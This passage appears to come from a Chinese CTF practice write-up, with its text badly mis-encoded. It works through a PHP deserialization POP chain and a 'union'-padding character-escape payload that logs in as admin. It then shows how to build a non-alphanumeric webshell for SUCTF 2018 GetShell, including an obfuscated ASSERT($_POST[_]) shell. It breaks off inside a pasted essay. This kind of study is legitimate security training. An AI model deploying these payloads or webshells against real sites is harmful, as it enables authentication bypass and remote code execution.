function __construct($age,$nickname)&#123;        $this-&gt;age&#x3D;$age;        $this-&gt;nickname&#x3D;$nickname;    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);&#x2F;&#x2F;callæ–¹æ³•çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªargumentå°±æ˜¯userç±»çš„ageå±æ€§ï¼Œæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚ç„¶åæˆ‘ä»¬å°†CtrlCaseå®ä¾‹åŒ–ä¸ºdbCtrlç±»çš„å¯¹è±¡ï¼Œå°±èƒ½è°ƒç”¨dbCtrlç±»çš„loginæ–¹æ³•ï¼Œå†é€šè¿‡æ§åˆ¶userç±»çš„ageï¼Œå®ç°å¯¹sqlè¯­å¥çš„æ§åˆ¶    &#125;&#125;Class UpdateHelper&#123;    public $id;    public $newinfo;    public $sql;    public function __construct($newInfo,$sql)&#123;        $newInfo&#x3D;unserialize($newInfo);        $upDate&#x3D;new dbCtrl();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;&#x2F;&#x2F;å°†sqlå®ä¾‹åŒ–ä¸ºUserç±»çš„å¯¹è±¡ï¼Œåœ¨è¯¥ç±»è¢«ç»“æŸé”€æ¯æ—¶è°ƒç”¨User::__toStringæ–¹æ³•å‡½æ•°    &#125;&#125;class dbCtrl&#123;    public $hostname&#x3D;&quot;127.0.0.1&quot;;    public $dbuser&#x3D;&quot;root&quot;;    public $dbpass&#x3D;&quot;root&quot;;    public $database&#x3D;&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    &#123;        $this-&gt;name&#x3D;$_POST[&#39;username&#39;];        $this-&gt;password&#x3D;$_POST[&#39;password&#39;];        $this-&gt;token&#x3D;$_SESSION[&#39;token&#39;];    &#125;    public function login($sql)    &#123;        $this-&gt;mysqli&#x3D;new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);        if ($this-&gt;mysqli-&gt;connect_error) &#123;            die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error);        &#125;        $result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);        $result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);        $result-&gt;execute();        $result-&gt;bind_result($idResult, $passwordResult);        $result-&gt;fetch();        $result-&gt;close();        if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123;            return $idResult;        &#125;        if (!$idResult) &#123;            echo(&#39;ç”¨æˆ·ä¸å­˜åœ¨!&#39;);            return false;        &#125;        if (md5($this-&gt;password)!&#x3D;&#x3D;$passwordResult) &#123;            echo(&#39;å¯†ç é”™è¯¯ï¼&#39;);            return false;        &#125;        $_SESSION[&#39;token&#39;]&#x3D;$this-&gt;name;        return $idResult;    &#125;    public function update($sql)    &#123;        &#x2F;&#x2F;è¿˜æ²¡æ¥å¾—åŠå†™    &#125;&#125;</code></pre><p>æ‰€ä»¥popé“¾ä¸ºUpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__call-&gt;dbCtrl::login($sql)</p><p>ååºåˆ—åŒ–è„šæœ¬ä¸º</p><pre class="language-none"><code class="language-none">&lt;?phpclass User&#123;    public $age&#x3D; &#39;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&#39; ;    public $nickname;    public  function __construct()    &#123;        $this -&gt; nickname &#x3D; new Info();    &#125;    public function __toString(): string    &#123;        $this-&gt;nickname-&gt;update($this-&gt;age);        return &quot;0-0&quot;;    &#125;&#125;class Info&#123;    public $age;    public $nickname;    public $CtrlCase;    public function __construct()&#123;        $this-&gt;CtrlCase &#x3D; new dbCtrl();    &#125;    public function __call($name,$argument)&#123;        echo $this-&gt;CtrlCase-&gt;login($argument[0]);    &#125;&#125;Class UpdateHelper&#123;    public $sql;    public function __construct()&#123;        $this -&gt;sql &#x3D; new User();    &#125;    public function __destruct()    &#123;        echo $this-&gt;sql;    &#125;&#125;class dbCtrl&#123;    public function __construct()    &#123;        $this-&gt;name&#x3D;&#39;admin&#39;;        $this-&gt;password&#x3D;&#39;1&#39;;    &#125;    public function login($sql)    &#123;    &#125;&#125;$a &#x3D; new UpdateHelper();echo serialize($a);&#x2F;&#x2F;&#x2F;&#x2F;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</code></pre><p>æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213027089.png" alt="image-20220317213027089"></p><p>æˆ‘ä»¬è¦æŠŠæˆ‘ä»¬çš„åºåˆ—åŒ–ç»“æœæ’å…¥åˆ°2çš„ä½ç½®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220317213946058.png" alt="image-20220317213946058"></p><p>å¯ä»¥çœ‹åˆ°æ’å…¥åä»–åªèƒ½è¢«ä½œä¸ºnicknameçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨ååºåˆ—åŒ–çš„å­—ç¬¦é€ƒé€¸ï¼Œåˆ©ç”¨safeå‡½æ•°ä¸­å°†unionæ›¿æ¢ä¸ºå…­ä¸ªå­—æ¯çš„hackerå®ç°é€ƒé€¸ï¼Œä¸¤ä¸ªç®­å¤´ä¹‹å†…çš„å€¼çš„æ•°é‡å°±æ˜¯æˆ‘ä»¬è¦æ·»åŠ çš„unionçš„å€¼</p><p>payload:</p><pre class="language-none"><code class="language-none">age&#x3D;1&amp;nickname&#x3D;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;&#125;</code></pre><p>ç„¶åç”¨æˆ·åä¸ºadminï¼Œå¯†ç ä¸º1ç™»å½•å³å¯</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143553884.png" alt="image-20220406143553884"></p><p>å¾ˆæ˜æ˜¾æ˜¯ä¼ ä¸ªä¸€å¥è¯ä¸Šå»ï¼Œä½†æ˜¯ä»–ä¼šå¯¹æ–‡ä»¶å†…å®¹ä»ç¬¬å…­ä½å¼€å§‹è¿›è¡Œé»‘åå•æ£€æµ‹ï¼Œç”¨bpç®€å•fuzzä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406143904075.png" alt="image-20220406143904075"></p><p>æ‹¬å·è¿˜æœ‰å–åç¬¦å·éƒ½æ²¡è¢«è¿‡æ»¤ï¼Œå‚è€ƒä¸€ä¸‹pç‰›çš„æ–‡ç« </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><strong>æ–¹æ³•ä¸€</strong></p><p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸²æ‰§è¡Œå¼‚æˆ–æ“ä½œä»¥åï¼Œå¾—åˆ°çš„è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æƒ³å¾—åˆ°a-zä¸­æŸä¸ªå­—æ¯ï¼Œå°±æ‰¾åˆ°æŸä¸¤ä¸ªéå­—æ¯ã€æ•°å­—çš„å­—ç¬¦ï¼Œä»–ä»¬çš„å¼‚æˆ–ç»“æœæ˜¯è¿™ä¸ªå­—æ¯å³å¯ã€‚</p><p><strong>æ–¹æ³•äºŒ</strong></p><p>å’Œæ–¹æ³•ä¸€æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œå”¯ä¸€å·®å¼‚å°±æ˜¯ï¼Œæ–¹æ³•ä¸€ä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„â€œå¼‚æˆ–â€ï¼Œæ–¹æ³•äºŒä½¿ç”¨çš„æ˜¯ä½è¿ç®—é‡Œçš„â€œå–åâ€ã€‚</p><p>æ–¹æ³•äºŒåˆ©ç”¨çš„æ˜¯UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œæ¯”å¦‚<code>&#39;å’Œ&#39;&#123;2&#125;</code>çš„ç»“æœæ˜¯<code>&quot;\x8c&quot;</code>ï¼Œå…¶å–åå³ä¸ºå­—æ¯<code>s</code>ï¼š</p><p><strong>æ–¹æ³•ä¸‰</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406144305986.png" alt="image-20220406144305986"></p><pre class="language-none"><code class="language-none">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);</code></pre><p>è¿™é¢˜é‡Œå–åç¬¦å·æ²¡è¢«è¿‡æ»¤ï¼Œé‚£æˆ‘ä»¬å°±ç”¨ç¬¬äºŒç§æ–¹æ³•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220406151728717.png" alt="image-20220406151728717"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„çš„æ–¹å¼ä»æ±‰å­—çš„å–åå€¼é‡Œè¯»å‡ºä¸€ä¸ªå­—æ¯</p><p>æ‰¾ç¯‡pç‰›çš„æ–‡ç« è·‘ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">&lt;?php$dome &#x3D; &#39;å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸æƒŠã€‚è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ 